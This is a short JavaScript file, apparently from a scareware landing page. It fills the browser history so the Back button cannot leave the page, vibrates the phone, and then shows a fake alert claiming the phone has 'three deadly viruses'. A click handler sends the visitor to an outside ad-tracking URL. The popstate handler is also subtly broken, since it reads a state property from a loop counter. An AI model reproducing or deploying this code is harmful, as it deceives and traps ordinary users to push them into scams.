! function() {
  var t;
  try {
    for (t = 0; 10 > t; ++t) history.pushState({}, "", window.location.href.split(window.location.hash || "#")[0] + "#");
    window.addEventListener('popstate', function() {
      t.state && location.replace(window.location.href.split(window.location.hash || "#")[0] + "#")
    });
  } catch (o) {}
}();

function load() {
  navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;
  navigator.vibrate([1000, 500, 1000, 500, 1000, 500]);
  setTimeout(function() {
    showAlert();
  }, 2000);
}

function launchpopLink(event) {
  try {
    event = event || window.event;
    if (event.preventDefault) {
      event.preventDefault();
      event.stopPropagation();
    } else {
      event.cancelBubble = true;
      event.returnValue = false;
    }
  } catch (o) {}
  window.location.replace("http://t.exclusivedealsonly.com/click");
  return false;
}

function showAlert() {
  alert("WARNING! Your Phone has (3) Deadly Viruses!\n\nThe Viruses may corrupt your data.\n\nPlease follow the instructions to remove the Viruses.");
}
